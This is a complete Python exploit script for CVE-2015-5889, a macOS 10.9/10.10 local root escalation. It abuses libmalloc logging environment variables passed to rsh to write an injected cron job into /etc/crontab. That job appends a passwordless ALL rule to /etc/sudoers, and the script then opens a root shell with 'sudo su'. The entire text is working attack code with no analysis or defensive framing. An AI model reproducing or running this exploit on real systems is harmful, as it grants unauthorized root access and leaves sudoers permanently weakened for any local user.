# CVE-2015-5889: issetugid() + rsh + libmalloc osx local root
# tested on osx 10.9.5 / 10.10.5
# jul/2015
# by rebel
 
import os,time,sys
 
env = {}
 
s = os.stat("/etc/sudoers").st_size
 
env['MallocLogFile'] = '/etc/crontab'
env['MallocStackLogging'] = 'yes'
env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo "ALL 
ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers\n\n\n\n\n'
 
sys.stderr.write("creating /etc/crontab..")
 
p = os.fork()
if p == 0:  
    os.close(1)
    os.close(2)
    os.execve("/usr/bin/rsh",["rsh","localhost"],env)
 
time.sleep(1)
 
if "NOPASSWD" not in open("/etc/crontab").read():
    sys.stderr.write("failed\n")
    sys.exit(-1)
 
sys.stderr.write("done\nwaiting for /etc/sudoers to change (<60 
seconds)..")
 
while os.stat("/etc/sudoers").st_size == s:
    sys.stderr.write(".")   
    time.sleep(1)
 
sys.stderr.write("\ndone\n")
 
os.system("sudo su")
